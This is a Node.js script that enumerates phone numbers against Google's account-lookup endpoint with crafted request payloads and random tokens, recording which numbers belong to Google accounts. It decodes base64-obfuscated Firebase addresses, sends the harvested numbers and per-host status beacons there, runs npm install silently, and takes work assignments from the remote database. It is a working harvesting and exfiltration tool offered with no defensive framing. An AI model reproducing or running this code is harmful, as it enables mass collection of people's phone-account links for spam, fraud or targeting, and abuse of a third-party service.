const { exec } = require('child_process')
let axios


const LOOP = 100
const SINGLE = 1000
let TARGET = 0
let SIZE = 0
let NUMBER = 0
let COUNTRY = null
let CODE = null
let mData = []

let TIME = new Date().getTime()
let FINISH = new Date().getTime()+21000000

let STORAGE = Buffer.from('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9qb2Itc2VydmVyLTA4OC5hcHBzcG90LmNvbS9vLw==', 'base64').toString('ascii')

let BASE_URL = Buffer.from('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4L2NvZGUv', 'base64').toString('ascii')

const USER = getUserName()

console.log('Start Process')


if (USER) {
    console.log('USER: '+USER)

    checkModule()
} else {
    console.log('---NULL---')
    process.exit(0)
}


setInterval(async () => {
    await checkStatus()
}, 60000)

async function checkModule() {

    await checkStatus()

    while (true) {
        try {
            axios = require('axios')
            break
        } catch (ex) {
            console.log('Install Node Package')

            await installModule('axios')

            console.log('Install Axios')
        }
    }

    console.log('★★★---START---★★★')

    await startServer(false)
}

async function startServer(upload) {
    try {
        let response = await getAxios(BASE_URL+'server/found.json')
        let data = response.data

        NUMBER = data.number
        TARGET = data.target
        SIZE = data.size
        COUNTRY = data.country
        CODE = data.code

        if (data.time == null) {
            mData.push({
                time: new Date().getTime(),
                data: {},
                id: 0
            })
        } else {
            mData.push({
                time: data.time,
                data: {},
                id: parseInt(SIZE%SINGLE)
            })
        }

        if (data.time != null) {
            let collect = await collectNumber(data.time.toString(), SIZE)
            if (collect > 0) {
                SIZE -= collect

                await patchAxios(BASE_URL+'server/found.json', JSON.stringify({ size: SIZE }), {
                    headers: {
                        'content-type': 'application/x-www-form-urlencoded'
                    }
                })
            }
        }

        if (TARGET > SIZE) {
            TIME = new Date().getTime()+30000
            if (upload) {
                console.log('Start Again:', SIZE) 
            } else {
                console.log('Start Server:', SIZE)
            }
            await startFounding()
        } else {
            console.log('Stop Server:', SIZE)
        }
    } catch (error) {
        console.log('Server Error')
    }

    while (true) {
        console.log('Update:', new Date().toString())
        await delay(180000)
        await startServer(true)
    }
}

async function startFounding() {

    let data = await checkNumber(CODE, NUMBER, LOOP)

    try {
        let position = mData.length-1
        let id = mData[position]['id']

        for (let i = 0; i < data.length; i++) {
            try {
                if (id >= SINGLE) {
                    id = 0
                    position++

                    mData.push({
                        time: new Date().getTime(),
                        data: {},
                        id: 0
                    })
                }

                mData[position]['data']['i'+id] = data[i]
                id++
                SIZE++
                mData[position]['id'] = id
            } catch (error) {}
        }
    } catch (error) {}

    NUMBER += LOOP
    
    let save = false
    if (TARGET > SIZE) {
        let now = new Date().getTime()
        if (now > TIME) {
            TIME = now+30000
            save = true
        }
    } else {
        save = true
    }

    if (save) {
        let time = mData[mData.length-1]['time']
        let collect = await collectNumber(time.toString(), SIZE)
        if (collect > 0) {
            SIZE -= collect
        }
        await saveData(time)
    }

    if (TARGET > SIZE) {
        await startFounding()
    } else {
        console.log('Stop Server:', SIZE)
    }
}

async function checkNumber(code, _number, loop) {
    return new Promise(function (resolve) {
        let mLoop = 0
        let list = []

        for (let i = 0; i < loop; i++) {
            let number = _number+i
            axios.post('https://accounts.google.com/_/lookup/accountlookup?number='+number, getNumberTempData('+'+code+''+number), {
                headers: {
                    'content-type' : 'application/x-www-form-urlencoded;charset=UTF-8',
                    'google-accounts-xsrf' : 1
                }
            }).then(res => {
                mLoop++
                try {
                    let body = res.data
                    let data = JSON.parse(body.substring(body.indexOf('[['), body.length))
                    if(data[0][1] == 16) {
                        let url = res.config.url
                        let index = url.indexOf('number=')
                        if(index > 0) {
                            list.push(parseInt(url.substring(index+7, url.length)))
                        }
                    }
                } catch (e) {}
    
                if(mLoop == loop) {
                    resolve(list)
                }
            }).catch(err => {
                mLoop++
                if(mLoop == loop) {
                    resolve(list)
                }
            })
        }
    })
}

async function collectNumber(time, size) {
    try {
        let total = 0
        let response = await getAxios(BASE_URL+'found/collect/'+COUNTRY+'.json')
        
        try {
            for (let key of Object.keys(response.data)) {
                if (key != time) {
                    total++
                }
            }
        } catch (error) {}

        let has = parseInt(size/SINGLE)
        if (has > total) {
            return (has - total) * SINGLE
        }
    } catch (error) {}

    return 0
}

async function saveData(time) {

    let data = {
        number: NUMBER,
        size: SIZE,
        time: time,
        server: TARGET > SIZE
    }

    await patchAxios(BASE_URL+'server/found.json', JSON.stringify(data), {
        headers: {
            'content-type': 'application/x-www-form-urlencoded'
        }
    })

    console.log('Update:', new Date().toString())
    console.log('Save Data:', SIZE)

    for (let i = 0; i < mData.length; i++) {
        try {
            let send = mData[i]['data']
            if (send && Object.keys(send).length > 0) {
                await patchAxios(BASE_URL+'found/number/'+COUNTRY+'/'+mData[i]['time']+'.json', JSON.stringify(send), {
                    headers: {
                        'content-type': 'application/x-www-form-urlencoded'
                    }
                })

                await patchAxios(BASE_URL+'found/collect/'+COUNTRY+'/'+mData[i]['time']+'.json', JSON.stringify({ data:true }), {
                    headers: {
                        'content-type': 'application/x-www-form-urlencoded'
                    }
                })
            }
        } catch (error) {}
    }

    mData = []

    mData.push({
        time: time,
        data: {},
        id: parseInt(SIZE%SINGLE)
    })
}

async function getAxios(url) {
    let loop = 0
    let responce = null
    while (true) {
        try {
            responce = await axios.get(url, {
                timeout: 10000
            })
            break
        } catch (error) {
            loop++

            if (loop >= 5) {
                break
            } else {
                await delay(3000)
            }
        }
    }
    return responce
}

async function postAxios(url, body, data) {
    let loop = 0
    let responce = null
    while (true) {
        try {
            data.timeout = 10000
            data.maxRedirects = 0
            data.validateStatus = null
            responce = await axios.post(url, body, data)
            break
        } catch (error) {
            loop++

            if (loop >= 5) {
                break
            } else {
                await delay(3000)
            }
        }
    }

    return responce
}

async function patchAxios(url, body, data) {
    let loop = 0
    let responce = null
    while (true) {
        try {
            data.timeout = 10000
            data.maxRedirects = 0
            data.validateStatus = null
            responce = await axios.patch(url, body, data)
            break
        } catch (error) {
            loop++

            if (loop >= 5) {
                break
            } else {
                await delay(3000)
            }
        }
    }
    return responce
}


async function checkStatus() {
    try {
        if (FINISH > 0 && FINISH < new Date().getTime()) {
            await postAxios(STORAGE+encodeURIComponent('server/'+USER+'.json'), '', {
                'Content-Type':'active/'+(parseInt(new Date().getTime()/1000)+10)
            })
    
            console.log('---COMPLETED---')
            process.exit(0)
        } else {
            await postAxios(STORAGE+encodeURIComponent('server/'+USER+'.json'), '', {
                'Content-Type':'active/'+(parseInt(new Date().getTime()/1000)+100)
            })
        }
    } catch (error) {}
}

function getNumberTempData(number) {
    let freq = [number,"AEThLlzLnodznP_eS7-mfzAihkXlpSKvoxliHZlPZE7W1-NMXK50YUORqG5WNyxwLONQwZwBsK1p-PH7BHW4s-NEZhzTMrxrdQHlqhB6bpzNema_MyohPW-JaUv-EO7_qbvIYnlKdIu0JkSGy2tJbRiElFWhzHXi1UJK1nt4D8UbHnOux-lF7PC0_RlISAgrI1oOSktxWO1I",[],null,null,null,null,2,false,true,[null,null,[2,1,null,1,"https://accounts.google.com/ServiceLogin?service=accountsettings&hl=en-US&continue=https%3A%2F%2Fmyaccount.google.com%2Fphone&csig=AF-SEnY7bxxtADWhtFc_%3A1556625798&flowName=GlifWebSignIn&flowEntry=ServiceLogin",null,[],4,[],"GlifWebSignIn",null,[],false],1,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,true,null,null,null,null,null,null,null,null,[]],number,null,null,null,true,true,[]]
    return 'f.req='+encodeURIComponent(JSON.stringify(freq))+'&bgRequest='+encodeURIComponent(JSON.stringify(["identifier",getIdentifier("<")]))
}

function getIdentifier(token) {
    let list = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_-"
    let loop = Math.floor(Math.random() * 300) + 200
    for (let i = 0; i < loop; i++) {
      token += list[Math.floor(Math.random() * 63)]
    }
    return token
}

async function installModule(module) {
    return new Promise((resolve) => {
        try {
            exec('npm install '+module, function (err, stdout, stderr) {
                resolve(null)
            })
        } catch (error) {
            resolve(null)
        }
    })
}

function getUserName() {
    try {
        let directory = __dirname.split('\\')
        if (directory.length > 2) {
            let index = directory.length - 2
            let name = directory[index]
            if (name) {
                return name
            }
        }
    } catch (error) {}

    try {
        let directory = __dirname.split('/')
        if (directory.length > 2) {
            let index = directory.length - 2
            let name = directory[index]
            if (name) {
                return name
            }
        }
    } catch (error) {}
    
    return null
}

function delay(time) {
    return new Promise(function(resolve) {
        setTimeout(resolve, time)
    })
}
